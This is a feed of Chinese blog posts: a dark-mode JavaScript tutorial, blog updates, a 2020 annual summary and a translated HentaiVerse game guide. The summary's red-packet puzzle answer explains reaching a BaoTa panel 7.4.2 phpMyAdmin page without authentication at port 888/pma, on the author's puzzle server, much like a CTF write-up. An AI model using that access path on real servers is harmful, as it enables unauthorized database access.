class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 